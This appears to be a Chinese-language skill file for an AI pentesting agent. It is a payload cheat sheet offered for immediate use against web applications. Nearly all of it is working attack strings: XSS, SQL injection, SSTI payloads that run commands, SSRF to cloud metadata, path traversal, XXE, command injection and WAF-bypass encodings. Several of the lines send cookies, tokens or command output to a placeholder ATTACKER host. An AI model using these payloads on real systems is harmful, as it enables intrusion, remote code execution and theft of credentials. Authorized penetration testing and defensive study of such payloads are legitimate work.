---
name: payload-quick-ref
description: 高频 payload 与绕过速查卡（XSS、SQLi、SSTI、SSRF、LFI、XXE、命令注入、开放重定向、PDF/CSV 注入、WAF 绕过编码）。当需要"马上给一个能用载荷"时读本 skill。
---
# Payload 速查卡

> 这是"手边抽屉"，不是教程。命中上下文后仍需验证：**回显/带外命中才算数**。

## XSS

```html
<!-- 基础三连 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 属性内闭合 -->
"><svg onload=alert(1)>
' onmouseover='alert(1)
javascript:alert(1)

<!-- 过滤绕过 -->
<img src=x oNeRrOr=alert(1)>            <!-- 大小写 -->
<img/src=x/onerror=alert(1)>            <!-- 斜杠代替空格 -->
<a href="jav&#x09;ascript:alert(1)">    <!-- HTML 实体 + 制表符 -->
<svg><script>alert&#40;1&#41;</script>
<iframe srcdoc="<script>alert(1)</script>">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

<!-- 无 script 关键字 / 长度受限 -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=alert`1`>

<!-- DOM XSS 常见汇聚点 -->
location.hash / location.search / innerHTML / document.write / jQuery.html()
eval / setTimeout(string) / new Function
<!-- 打 cookie / 打接口 -->
<img src=x onerror="fetch('//ATTACKER/?c='+document.cookie)">
<script>new Image().src='//ATTACKER/?c='+localStorage.token</script>
```
**CSP 存在时**：找 `unsafe-inline`/`unsafe-eval`、JSONP 端点、可上传的 JS（同源）、`base-uri` 未限制（`<base href>`）、`script-src *`。

## SQLi 片段

```sql
' OR '1'='1
' UNION SELECT NULL,NULL,NULL-- -
' AND (SELECT SLEEP(3))-- -
' AND 1=CAST((SELECT version()) AS int)-- -         -- PG 报错回显
1' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- -   -- MySQL 报错
';WAITFOR DELAY '0:0:3'-- -
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
```
出数据时的编码技巧：`GROUP_CONCAT`（MySQL）/ `STRING_AGG`（PG）/ `FOR XML PATH`（MSSQL）。

## SSTI

```
{{7*7}}  ${7*7}  #{7*7}  %{7*7}  [[${7*7}]]
{{config}}  {{self}}  {{''.__class__.__mro__}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<#assign e="freemarker.template.utility.Execute"?new()>${e("id")}
```

## SSRF 变形

```
http://127.0.0.1  http://127.1  http://0  http://0x7f000001  http://2130706433
http://[::1]  http://127.0.0.1:80@attacker.com  http://attacker.com#@127.0.0.1
http://169.254.169.254/latest/meta-data/
file:///etc/passwd   gopher://127.0.0.1:6379/_INFO   dict://127.0.0.1:11211/stat
```

## LFI / 路径穿越

```
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f
/etc/passwd%00.png
php://filter/convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
/proc/self/environ   /proc/self/cmdline   /proc/self/fd/8
```

## XXE

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://ATTACKER/leak">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY % p SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

## 命令注入

```
; id
|id
||id
&id
&&id
%0aid
`id`
$(id)
id;curl http://ATTACKER/$(whoami)
id;nslookup $(id|base64 -w0).ATTACKER
```
**空格被过滤**：`${IFS}`、`$IFS$9`、`%09`、`<>`、`{cat,/etc/passwd}`。

## 开放重定向

```
?next=//attacker.com
?url=https://target.com@attacker.com
?url=//attacker.com/%2F..
?url=https:attacker.com
?redirect=/\attacker.com
?return=http://attacker.com\@target.com
```

## 文件上传后缀

```
.php .php3 .php4 .php5 .phtml .pht .phar .inc .module
.php.jpg  .php%00.jpg  .php.  .php::$DATA  .PHP  .pHp5
.htaccess（改解析规则）  .user.ini（PHP-FPM 场景）
```

## CSV / 公式注入（导出功能）

```
=cmd|' /C calc'!A0
=HYPERLINK("http://ATTACKER/?d="&A1,"点我")
+1+1  @SUM(1+1)  -1+1      （绕过前置字符过滤）
```

## WAF 绕过编码表

| 原字符 | 变形 |
|---|---|
| 空格 | `%20` `%09` `%0a` `/**/` `+` `${IFS}` |
| `<` `>` | `%3c` `%3e` `&lt;` `\u003c` |
| `'` | `%27` `\'` `''` `%u0027` |
| `SELECT` | `SeLeCt` `SEL/**/ECT` `%53%45%4C%45%43%54` |
| `.` `..` | `%2e` `%252e` `..;/` `....//` |
| `/` | `%2f` `%5c` `..%5c` |

**多层编码**：当单层被解一次仍拦，用 `%25` 套 `%2e`（双编码，取决于后端解码次数）。

## 使用纪律

1. 先用**最小无害载荷**证明存在（`alert(1)`、`sleep 3`、DNS 带外），再上利用载荷。
2. 每换一个载荷都改一处变量（上下文/编码/位置），别一次改五个。
3. 打不穿就换位置：参数名、Header、Cookie、路径段、JSON 键名、文件名、multipart 的 filename。
4. 命中后立刻 `report_finding` 附原始请求/响应，再继续深挖链。
